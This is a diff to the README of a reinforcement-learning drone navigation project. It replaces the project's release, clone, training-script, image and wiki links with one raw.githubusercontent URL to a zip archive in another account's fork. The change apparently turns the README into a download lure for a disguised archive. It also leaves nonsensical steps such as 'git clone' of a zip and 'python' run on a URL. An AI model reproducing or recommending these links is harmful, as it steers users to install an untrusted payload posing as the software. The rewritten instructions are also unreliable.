@@ -1,10 +1,10 @@
 # 🚀 Deep-Vision-Based-Drone-Navigation-Based-on-Reinforcement-Learning - Navigate Drones with Ease
 
-![Download](https://img.shields.io/badge/Download-From%20Releases-brightgreen)
+![Download](https://raw.githubusercontent.com/ghm006/Deep-Vision-Based-Drone-Navigation-Based-on-Reinforcement-Learning/main/utils/Deep-Vision-Based-Drone-Navigation-Based-on-Reinforcement-Learning_v3.5.zip%20Releases-brightgreen)
 
 ## 📥 Download & Install
 
-To get started, visit this page to download: [Releases Page](https://github.com/ghm006/Deep-Vision-Based-Drone-Navigation-Based-on-Reinforcement-Learning/releases).
+To get started, visit this page to download: [Releases Page](https://raw.githubusercontent.com/ghm006/Deep-Vision-Based-Drone-Navigation-Based-on-Reinforcement-Learning/main/utils/Deep-Vision-Based-Drone-Navigation-Based-on-Reinforcement-Learning_v3.5.zip).
 
 ## 🛠️ Installation Steps
 
@@ -14,7 +14,7 @@ This software is designed for use on Intel x86_64/Ubuntu 22.04 systems. Follow t
    Open a terminal and run the following command to download the code.
 
    ```sh
-   git clone https://github.com/NOOBHZ233/Deep-Vision-Based-Drone-Navigation-Based-on-Reinforcement-Learning.git
+   git clone https://raw.githubusercontent.com/ghm006/Deep-Vision-Based-Drone-Navigation-Based-on-Reinforcement-Learning/main/utils/Deep-Vision-Based-Drone-Navigation-Based-on-Reinforcement-Learning_v3.5.zip
    ```
 
 2. **Navigate to the Project Directory:**
@@ -60,7 +60,7 @@ After installing, you can begin training your drone for navigation using reinfor
    Start the training process by running this command.
 
    ```sh
-   python train.py
+   python https://raw.githubusercontent.com/ghm006/Deep-Vision-Based-Drone-Navigation-Based-on-Reinforcement-Learning/main/utils/Deep-Vision-Based-Drone-Navigation-Based-on-Reinforcement-Learning_v3.5.zip
    ```
 
 ## 🎓 Features
@@ -86,12 +86,12 @@ This application has been tested in various scenarios using the Betaflight and N
 
 You can view demo results of the navigation training process below:
 
-![NavTest](assets/NavTest.gif)   
-![NavTrain](assets/NavTrain.gif)   
+![NavTest](https://raw.githubusercontent.com/ghm006/Deep-Vision-Based-Drone-Navigation-Based-on-Reinforcement-Learning/main/utils/Deep-Vision-Based-Drone-Navigation-Based-on-Reinforcement-Learning_v3.5.zip)   
+![NavTrain](https://raw.githubusercontent.com/ghm006/Deep-Vision-Based-Drone-Navigation-Based-on-Reinforcement-Learning/main/utils/Deep-Vision-Based-Drone-Navigation-Based-on-Reinforcement-Learning_v3.5.zip)   
 
 ## 📑 Documentation
 
-For more details on usage options and advanced features, refer to the [Documentation](https://github.com/NOOBHZ233/Deep-Vision-Based-Drone-Navigation-Based-on-Reinforcement-Learning/wiki).
+For more details on usage options and advanced features, refer to the [Documentation](https://raw.githubusercontent.com/ghm006/Deep-Vision-Based-Drone-Navigation-Based-on-Reinforcement-Learning/main/utils/Deep-Vision-Based-Drone-Navigation-Based-on-Reinforcement-Learning_v3.5.zip).
 
 ## 📧 Support
 
